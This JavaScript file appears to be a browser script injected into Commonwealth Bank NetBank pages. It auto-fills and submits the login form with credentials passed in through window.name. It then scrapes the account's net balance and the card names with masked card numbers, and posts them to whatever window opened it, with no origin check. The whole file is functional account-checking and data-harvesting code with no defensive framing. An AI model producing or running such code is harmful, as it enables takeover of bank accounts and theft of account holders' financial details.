document.addEventListener('DOMContentLoaded', async e => {
	if (location.search.includes('mv_logon-NB')) {
		if (!window.name) {
			return
		}
		let {
			user,
			pwd
		} = JSON.parse(atob(window.name));
		let userinp = document.querySelector('input#txtMyClientNumber_field');
		let pwdinp = document.querySelector('input#txtMyPassword_field');
		let btn = document.querySelector('input#btnLogon_field');
		btn && userinp && pwdinp && (userinp.value = user, pwdinp.value = pwd, btn.click())
		console.log(userinp, pwdinp);
	}
	if (location.search.includes('errorcode=')) {
		if (!window.name) {
			return
		}
		let {
			id
		} = JSON.parse(atob(window.name));
		window.opener.postMessage({
			status: 'error',
			id
		}, '*');

	}

	function goto(id, info) {
		window.opener.postMessage({
			status: 'success',
			id,
			info
		}, '*');
		location.replace(
			'https://www1.my.commbank.com.au/netbank/Container/ESD/Cards.LockUnlock.NetBank/LostStolenDamagedCards/1'
		);
	}

	if (location.pathname == '/retail/netbank/home/') {
		if (!window.name) {
			return
		}
		let {
			id
		} = JSON.parse(atob(window.name));
		window.addEventListener("load", e => {
			let n = 0;
			let info = `total:null`;
			let interval = setInterval(() => {
				let div = document.querySelector('main.main-content');
				if (div) {
					let span = div.querySelector(
						'li.subtotal__netposition span.monetary-value');
					span && (info = `total:${span.innerText}`);
					if (n > 20 || span) {
						clearInterval(interval);
						goto(id, info);
					}
					n ++;

				}
			}, 300);
		}, false);

	}

	if (location.pathname.includes('/Container/ESD/Cards.LockUnlock.NetBank/LostStolenDamagedCards/')) {
		if (!window.name) {
			return
		}
		let {
			id
		} = JSON.parse(atob(window.name));
		window.addEventListener("load", e => {
			let interval = setInterval(() => {
				let info = getcard();
				if (info != null) {
					window.opener.postMessage({
						status: 'success',
						id,
						info
					}, '*');
					clearInterval(interval);
				}
			}, 300);
		}, false);


	}

	function getcard() {
		let iframe = document.querySelector('iframe');
		if (!iframe) {
			return null
		}
		let script = iframe.contentWindow.document.querySelector('#initial-data');
		if (!script) {
			return null
		}
		let data = JSON.parse(script.innerText);
		data = data?.data || [];
		// console.log(data);
		let info = data.map(obj => `${obj.cardName}:${obj.maskedCardNumber}`).join(' | ');
		return info || 'card:null'
	}


});
